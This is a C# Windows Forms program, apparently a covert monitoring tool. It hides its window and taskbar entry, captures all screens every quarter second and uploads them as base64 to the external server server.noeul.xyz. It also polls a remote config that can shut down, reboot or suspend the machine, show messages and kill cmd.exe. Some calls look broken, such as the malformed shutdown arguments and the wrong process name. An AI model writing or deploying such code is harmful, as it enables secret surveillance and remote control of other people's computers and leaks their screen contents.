using System;
using System.Net;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

namespace SCSU
{
    public partial class Form1 : Form
    {
        bool cmd = false;
        bool taskmgr = false;
        bool looping = true;
        public Form1()
        {
            InitializeComponent();
            Opacity = 0;
            ShowInTaskbar = false;
        }
        private void GetPicture_Tick(object sender, EventArgs e)
        {
            string url = "Text Server 1";
            WebClient client = new WebClient();
            JObject setting = JObject.Parse(client.DownloadString(url));
            if ((bool)setting["off"])
            {
                setting["off"] = false;
                client.UploadString(url, "PUT", setting.ToString());
                System.Diagnostics.Process.Start("shutdown /s /t 0");
            }
            if ((bool)setting["reboot"])
            {
                setting["reboot"] = false;
                client.UploadString(url, "PUT", setting.ToString());
                System.Diagnostics.Process.Start("shutdown /r /t 0");
            }
            if ((bool)setting["standby"])
            {
                setting["standby"] = false;
                client.UploadString(url, "PUT", setting.ToString());
                Application.SetSuspendState(PowerState.Suspend, false, false);
            }
            if ((bool)setting["havemessage"])
            {
                setting["havemessage"] = false;
                client.UploadString(url, "PUT", setting.ToString());
                MessageBox.Show(setting["message"].ToString(),"새 매시지");
            }
            if ((bool)setting["cmd"] != cmd)
            {
                cmd = (bool)setting["cmd"];
                System.Threading.Thread cmdthread = new Thread(new ThreadStart(cmdloop));
                cmdthread.Start();
            }
            if ((bool)setting["taskmgr"] != taskmgr)
            {
                taskmgr = (bool)setting["taskmgr"];
                if (taskmgr)
                {

                }
            }
        }
        private void cmdloop ()
        {
            while (cmd)
            {
                Process[] process = Process.GetProcessesByName("cmd.exe");
                process[0].Kill();
            }
        }
        private Bitmap CaptureImage(int i)
        {
            Rectangle rectangle = Screen.AllScreens[i].Bounds;
            int bpp = Screen.PrimaryScreen.BitsPerPixel;
            PixelFormat pixelFormat = PixelFormat.Format32bppArgb;
            if (bpp <= 16)
            {
                pixelFormat = PixelFormat.Format16bppRgb565;
            }
            else if (bpp == 24)
            {
                pixelFormat = PixelFormat.Format24bppRgb;
            }
            Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, pixelFormat);
            using (Graphics gp = Graphics.FromImage(bitmap))
            {
                gp.CopyFromScreen(rectangle.Left, rectangle.Top, 0, 0, rectangle.Size);
            }
            Size resize = new Size(1280, 720);
            bitmap = new Bitmap(bitmap, resize);
            return bitmap;
        }
        private string ToBase64(Bitmap bitmap)
        {
            MemoryStream ms = new MemoryStream();
            bitmap.Save(ms, ImageFormat.Jpeg);
            return Convert.ToBase64String(ms.ToArray());
        }
        private void loop()
        {
            while (looping)
            {
                try
                {
                    Bitmap screen = CaptureImage(0);
                    string base64 = ToBase64(screen);
                    if (SystemInformation.MonitorCount > 1)
                    {
                        Bitmap second = CaptureImage(1);
                        base64 += ";" + ToBase64(second);
                    }
                    WebClient client = new WebClient();
                    client.Headers.Add("Content-Type", "text/plain");
                    client.UploadString("http://server.noeul.xyz:1234/api/imgJson/2/3", "PUT", base64);
                }
                catch { }
                System.Threading.Thread.Sleep(250);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            loop();
        }
    }
}
